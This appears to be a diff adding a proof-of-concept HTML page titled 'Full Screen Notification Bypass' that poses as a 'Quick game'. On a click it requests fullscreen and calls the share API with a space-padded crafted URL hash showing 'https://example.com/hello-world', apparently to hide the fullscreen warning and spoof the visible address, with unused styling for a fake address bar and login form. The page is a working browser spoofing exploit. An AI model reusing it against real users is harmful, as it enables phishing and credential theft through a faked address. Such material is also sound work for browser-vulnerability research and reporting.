@@ -1,0 +1,101 @@
+<!doctype html>
+<html>
+<head>
+<title>Full Screen Notification Bypass</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+html { font-family: sans-serif; }
+body { width: 100vw; height: 100vh; }
+	.button-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      /* Style for the button */
+      button {
+        padding: 20px;
+        font-size: 24px;
+        background-color: #4CAF50;
+        color: white;
+        border: none;
+        cursor: pointer;
+        border-radius: 5px;
+      }
+	  
+	  #spoofBar {
+            display: block;
+            top: 0%;
+            position: absolute;
+        }
+
+        #hidden {
+            display: none;
+        }
+		
+		#login-form {
+			display: none;
+			width: 300px;
+			margin: auto;
+			padding: 20px;
+			background-color: #f7f7f7;
+			border: 1px solid #ccc;
+			border-radius: 5px;
+		}
+		
+		#login-form label {
+			display: block;
+			margin-bottom: 10px;
+			font-weight: bold;
+		}
+		
+		#login-form input[type="text"],
+		#login-form input[type="password"] {
+			display: block;
+			width: 100%;
+			padding: 5px;
+			margin-bottom: 10px;
+			border: 1px solid #ccc;
+			border-radius: 3px;
+			box-sizing: border-box;
+		}
+		
+		#login-form button {
+			display: block;
+			width: 100%;
+			padding: 10px;
+			background-color: #4CAF50;
+			color: #fff;
+			border: none;
+			border-radius: 3px;
+			cursor: pointer;
+		}
+
+</style>
+</head>
+<body>
+<h1>Quick game...</h1>
+<button id="button-container">Tap twice & Have A Nice Dream</button>
+<script>
+
+var craftedHash = '#%20%20%20%20https://example.com/hello-world%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20';
+
+const shareData = {
+  text: 'Title From JavaScript',
+  url: window.location.origin + '/' + craftedHash
+}
+
+var firstClick = true;
+
+document.body.addEventListener('click', async () => {
+  if (firstClick) {
+    firstClick = false;
+    document.documentElement.requestFullscreen();
+	navigator.share(shareData);
+  }
+  navigator.share(shareData);
+});
+</script>
+</body>
+</html>
